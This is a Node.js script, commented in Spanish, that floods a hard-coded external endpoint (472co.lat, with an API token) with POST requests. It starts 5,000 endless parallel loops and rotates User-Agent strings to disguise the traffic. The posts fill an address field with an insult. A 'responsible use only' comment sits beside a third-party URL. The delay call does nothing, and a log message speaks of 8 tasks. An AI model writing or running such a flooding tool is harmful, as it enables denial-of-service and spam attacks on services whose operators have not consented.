// Uso responsable: sólo para pruebas en tu propio endpoint o con permiso.
const axios = require('axios');

const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Gecko/20100101 Firefox/89.0',
  // Agrega más User-Agents
];
const URL = 'https://472co.lat/ShvnVrzgWH/api/input?token=6c8b869-d16b-4a7b-8651-1c16aade3e27X'; // usar tu staging
let sent = 0;

async function sendOnce(index) {
  const randomUA = userAgents[Math.floor(Math.random() * userAgents.length)];
    try {
        const resp = await axios.post(URL, {
        "content": {
            "type": "input_address",
            "key": "address",
            "text": "la-puta-que-los-pario"
        },
        "timestamp": 1762271823134
        },
        {
          'User-Agent': randomUA
        });

        console.log(`Hilo: ${index} - OK ${sent}: ${resp.status}`);
    } catch (err) {
        if (err.response) {
        console.warn(`ERR ${sent}: HTTP ${err.response.status}`);
        } else {
        console.warn(`ERR ${sent}:`, err.code);
        }
    }
}

async function run(index) {
    while (true) {
      setTimeout(() => {}, 200)
        await sendOnce(index);
        sent++;
    }
  console.log('Prueba finalizada.');
}

async function runOnceParallel8() {
  const tasks = Array.from({ length: 5000 }, (_, i) => run(i));
  try {
    const results = await Promise.all(tasks);
    console.log('Los 8 terminaron. Estados:', results.map(r => r.status));
  } catch (err) {
    console.warn('Al menos una petición falló:', err.message || err);
  }
}

runOnceParallel8();

// run();
